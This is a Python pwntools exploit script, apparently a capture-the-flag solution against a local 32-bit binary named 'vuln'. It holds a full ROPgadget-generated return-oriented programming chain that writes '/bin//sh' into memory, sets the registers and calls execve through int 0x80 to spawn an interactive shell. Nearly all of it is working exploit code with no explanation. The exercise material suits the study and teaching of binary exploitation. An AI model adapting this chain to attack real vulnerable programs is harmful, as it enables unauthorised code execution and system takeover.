#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

from struct import pack
# ROPgadget --ropchain --badbytes 0a --binary vuln
# execve generated by ROPgadget
# Padding goes here
p = '\x90' * 28

p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da060)  # @ .data
p += pack('<I', 0x08056334)  # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('<I', 0x080da060)  # padding without overwrite edx
p += pack('<I', 0x41414141)  # padding
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da064)  # @ .data + 4
p += pack('<I', 0x08056334)  # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('<I', 0x080da064)  # padding without overwrite edx
p += pack('<I', 0x41414141)  # padding
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x08056420)  # xor eax, eax ; ret
p += pack('<I', 0x08056e65)  # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9)  # pop ebx ; ret
p += pack('<I', 0x080da060)  # @ .data
p += pack('<I', 0x0806ee92)  # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x080da060)  # padding without overwrite ebx
p += pack('<I', 0x0806ee6b)  # pop edx ; ret
p += pack('<I', 0x080da068)  # @ .data + 8
p += pack('<I', 0x08056420)  # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x0807c2fa)  # inc eax ; ret
p += pack('<I', 0x08049563)  # int 0x80

io = process("./vuln")
io.recvuntil('Can you ROP your way out of this one?')
io.sendline(p)
io.interactive()
